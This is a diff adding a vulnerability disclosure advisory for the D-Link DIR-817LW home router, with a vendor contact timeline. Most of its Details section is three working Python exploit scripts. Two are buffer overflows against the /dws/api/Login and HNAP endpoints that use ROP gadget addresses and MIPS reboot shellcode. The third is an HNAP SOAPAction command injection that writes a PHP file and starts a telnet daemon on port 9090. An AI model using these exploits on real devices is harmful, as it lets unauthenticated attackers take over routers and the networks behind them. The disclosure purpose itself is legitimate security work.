@@ -1,0 +1,106 @@
+## Advisory Information
+
+Title: DIR-817LW Buffer overflows and Command injection in authentication and HNAP functionalities
+Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares.The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.  
+
+## Product Description
+
+DIR-817LW -- Wireless AC750 Dual Band Cloud Router. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+Have come across 3 security issues in DIR-815 firmware which allows an attacker to exploit command injection and buffer overflows in authentication adn HNAP functionality. All of them can be exploited by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack directly or using XSRF if not exposed.
+
+## Details
+
+Buffer overflow in auth 
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+#Reboot shellcode in there
+
+
+buf = "GET /dws/api/Login?id="
+buf+="A"*2064+"AAAA" #s0 # uclibc system address
+buf+="\x2A\xAF\xD0\x84" #s1 -- points to iret
+buf+="\x2A\xB1\x4D\xF0" #s2 -- points to sleep
+buf+="\x2A\xB1\x4D\xF0"
+buf+="\x2A\xB1\x4D\xF0"
+buf+="\x2A\xB1\x4D\xF0"
+buf+="\x2A\xB0\xDE\x54" # s6 filled up with pointer to rop4 which is ultimate mission
+buf+="\x2A\xB1\x4D\xF0"
+buf+="\x2A\xAC\xAD\x70" # Retn address  ROP gadget 1 that loads into $a0
+buf+="C"*36 # 
+buf+="\x2A\xAC\xD5\xB4" # points to rop3 
+#buf+="1"*17 # exit payload
+buf+="E"*16
+buf+="\x3c\x06\x43\x21\x34\xc6\xfe\xdc\x3c\x05\x28\x12\x34\xa5\x19\x69\x3c\x04\xfe\xe1\x34\x84\xde\xad\x24\x02\x0f\xf8\x01\x01\x01\x0c" #reboot big endian 
+buf+="Y"*120 # ROP gadget 2 that loads into $t9
+buf+="&password=A HTTP/1.1\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\nContent-Length:5000\r\n\r\nid="+"A"*5000+"\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.1.8", 80))
+s.send(buf)
+
+----------------------------------------------------------------------------------------------------------------------
+
+
+Buffer overflow in HNAP
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+# Working
+
+buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ";sh;"+"B"*158
+buf+="\x2A\xAF\xD0\x84" #s1 -- points to iret
+buf+="\x2A\xB1\x4D\xF0" #s2 -- points to sleep
+buf+="AAAA"+"AAAA"+"AAAA" #s3,s4,s5
+buf+="\x2A\xB0\xDE\x54" # s6 filled up with pointer to rop4 which is ultimate mission
+buf+="AAAA"
+buf+="\x2A\xAC\xAD\x70" # Retn address  ROP gadget 1 that loads into $a0
+buf+="C"*36
+buf+="\x2A\xAC\xD5\xB4" # points to rop3 
+buf+="C"*16
+buf+="\x3c\x06\x43\x21\x34\xc6\xfe\xdc\x3c\x05\x28\x12\x34\xa5\x19\x69\x3c\x04\xfe\xe1\x34\x84\xde\xad\x24\x02\x0f\xf8\x01\x01\x01\x0c" #reboot big endian shell
+buf+="B"*28+"\r\n" + "1\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.1.8", 80))
+s.send(buf)
+----------------------------------------------------------------------------------------------------------------------
+
+Command injection 
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+# CSRF or any other trickery, but probably only works when connected to network I suppose and internal
+
+buf = "POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX" + ';echo "<?phpinfo?>" > passwd1.php;telnetd -p 9090;test\r\n' + "1\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("1.2.3.4", 80))
+s.send(buf)
+
+----------------------------------------------------------------------------------------------------------------------
+
+## Report Timeline
+
+* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.
+* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
